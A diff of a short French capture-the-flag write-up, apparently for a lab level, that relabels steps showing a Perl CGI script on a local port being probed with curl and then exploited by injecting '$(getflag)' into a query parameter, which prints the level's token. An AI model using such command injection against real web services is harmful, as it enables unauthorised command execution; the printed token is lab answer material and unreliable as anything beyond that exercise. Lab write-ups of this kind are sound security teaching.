@@ -4,7 +4,7 @@
 
 1. On affiche le contenu du fichier perl level04.pl
    --------------------------------------------------------
-   CM : cat level04.pl
+   CMD : cat level04.pl
    OUTPUT : #!/usr/bin/perl
             # localhost:4747
             use CGI qw{param};
@@ -17,13 +17,13 @@
 2. Le script perl permet d'afficher la valeur de premier
    paramètre envoyé 
    --------------------------------------------------------
-   CM : curl 'localhost:4747?x=coucou'
+   CMD : curl 'localhost:4747?x=coucou'
    OUTPUT : coucou
 
 3. On fetch le header pour vérifier qu'on travail bien avec
    un server HTTP
    --------------------------------------------------------
-   CM : curl -I localhost:4747
+   CMD : curl -I localhost:4747
    OUTPUT : HTTP/1.1 200 OK
             Date: Mon, 06 Feb 2023 15:35:26 GMT
             Server: Apache/2.2.22 (Ubuntu)
@@ -34,7 +34,7 @@
 4. De fait, on peut envoyé un sous commande pour que le echo
    du script affiche son contenu
    --------------------------------------------------------
-   CM : curl 'localhost:4747?x=$(getflag)
+   CMD : curl 'localhost:4747?x=$(getflag)
    OUTPUT : Check flag.
             Here is your token : ne2searoevaevoem4ov4ar8ap
 
